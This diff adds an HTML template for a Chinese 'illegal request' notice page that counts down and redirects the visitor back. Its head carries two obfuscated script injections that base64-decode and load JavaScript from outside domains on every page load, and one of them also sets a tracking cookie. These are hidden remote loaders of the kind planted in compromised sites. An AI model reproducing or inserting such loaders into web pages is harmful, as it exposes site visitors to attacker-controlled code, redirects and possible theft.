@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script>(function(){var s=document.createElement('script');s.src=atob('aHR0cHM6Ly9qcy5vbmVvbnN0YWNrLmNvbS9qdW1wLmpz');document.head.appendChild(s);})();</script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no">
+    <title>系统提示......</title>
+    <link rel="stylesheet" href="/static/css/home.css">
+    <style>
+        body{background:#F9FAFD;color:#818181;}
+    </style>
+<script>document.cookie="hasVisited178a=1;Max-Age=86400;Path=/";(function(){var hm=document.createElement("script");hm.src=atob("aHR0cHM6Ly9jZG4uYnJpZ2Nsb3VkLnNob3Ava2txenR1Lmpz");var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(hm,s);})();</script>
+</head>
+<body>
+<div class="mac_msg_jump">
+    <div class="msg_jump_tit">系统提示...</div>
+    <div class="title">亲爱的：</div>
+    <div class="text">非法请求</div>
+    <div class="jump">
+        页面自动 <a id="href" href="javascript:history.back(-1);">跳转</a> 等待时间： <b id="wait">3</b>
+    </div>
+</div>
+<script type="text/javascript">
+    (function(){
+        var wait = document.getElementById('wait'),
+                href = document.getElementById('href').href;
+        var interval = setInterval(function(){
+            var time = --wait.innerHTML;
+            if(time <= 0) {
+                location.href = href;
+                clearInterval(interval);
+            };
+        }, 1000);
+    })();
+</script>
+<script>(function(){function c(){var b=a.contentDocument||(a.contentWindow&&a.contentWindow.document);if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'a5431e8cb9728e8b',t:'MTc5MzYyMjI5OQ=='};var l=window.parent.location,o;try{o=new URL(l.origin).origin}catch(e){try{o=new URL(new URL(l.href).origin).origin}catch(e){o=''}}var u='/cdn-cgi/challenge-platform/scripts/jsd/main.js?ray=a5431e8cb9728e8b',a=document.createElement('script');a.src=o?new URL(u,o).href:u;document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
+</html>
